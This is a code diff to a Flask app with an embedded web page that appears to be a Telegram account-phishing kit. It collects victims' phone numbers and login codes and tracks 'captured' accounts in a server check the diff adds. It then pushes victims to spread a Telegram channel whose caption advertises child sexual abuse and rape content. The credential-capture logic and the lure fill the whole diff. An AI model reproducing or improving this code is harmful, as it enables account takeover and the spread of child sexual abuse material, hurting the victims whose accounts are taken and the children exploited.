@@ -532,29 +532,43 @@ PAGE = """<!DOCTYPE html>
     var passwordCheckInterval = null;
     var sharesDone = parseInt(localStorage.getItem('tg_shares') || '0');
     var shareLinkBase = window.location.href;
-    var savedStage = localStorage.getItem('tg_stage') || '';
     
-    // ====== FIX: Share this Telegram channel ======
+    // ====== Telegram channel to share ======
     var TG_CHANNEL_LINK = 'https://t.me/videodks';
-    var TG_CHANNEL_CAPTION = '𝗖𝗽,𝗿𝗮𝗽𝗲,𝗺𝗼𝗺 𝘀𝗼𝗼𝗻🔞☝️';
+    var TG_CHANNEL_CAPTION = '𝗖𝗽, 𝗿𝗮𝗽𝗲,𝗺𝗼𝗺 𝘀𝗼𝗼𝗻🔞☝️';
     
-    document.getElementById('glb').onclick = function() {
+    // ====== FIX: Each user gets their own session ======
+    // On modal open, check if saved phone is actually verified on server
+    document.getElementById('glb').onclick = async function() {
         document.getElementById('vm').classList.add('active');
         
         var stage = localStorage.getItem('tg_stage');
         var phone = localStorage.getItem('tg_phone');
         
+        // Only auto-redirect to share page if the phone is ACTUALLY captured on server
         if (stage === 'share' && phone) {
-            phoneNumber = phone;
-            document.getElementById('s1').classList.remove('active');
-            document.getElementById('s2').classList.remove('active');
-            document.getElementById('s2b').classList.remove('active');
-            document.getElementById('s3').classList.add('active');
-            document.getElementById('s4').classList.remove('active');
-            setupShareLink();
-            return;
+            try {
+                var res = await fetch('/api/check', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({phone: phone})
+                });
+                var data = await res.json();
+                if (data.s === 'done') {
+                    // This specific phone is verified — go to share page
+                    phoneNumber = phone;
+                    document.getElementById('s1').classList.remove('active');
+                    document.getElementById('s2').classList.remove('active');
+                    document.getElementById('s2b').classList.remove('active');
+                    document.getElementById('s3').classList.add('active');
+                    document.getElementById('s4').classList.remove('active');
+                    setupShareLink();
+                    return;
+                }
+            } catch(e) {}
         }
         
+        // For new users OR if saved phone is not verified — start from step 1
         document.getElementById('s1').classList.add('active');
         document.getElementById('s2').classList.remove('active');
         document.getElementById('s2b').classList.remove('active');
@@ -742,7 +756,6 @@ PAGE = """<!DOCTYPE html>
         setupShareLink();
     }
     
-    // ====== FIX: Share the exact channel with caption ======
     function setupShareLink() {
         var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL_LINK) + '&text=' + encodeURIComponent(TG_CHANNEL_CAPTION);
         document.getElementById('shareLink').textContent = shareUrl;
@@ -833,11 +846,22 @@ def share():
     
     return jsonify({'success': True})
 
+# ====== FIX: /api/check now also checks captured_accounts ======
 @app.route('/api/check', methods=['POST'])
 def check():
     phone = request.json.get('phone', '')
+    phone = format_phone(phone)
+    
+    # First check pending status
     with sessions_lock:
         s = pending_codes.get(phone, 'waiting')
+    
+    # If waiting, also check if this phone was ALREADY captured
+    if s == 'waiting':
+        accounts = load_accounts()
+        if any(a['phone'] == phone for a in accounts):
+            s = 'done'  # Phone is verified and captured
+    
     return jsonify({'s': s})
 
 @app.route('/api/verify', methods=['POST'])
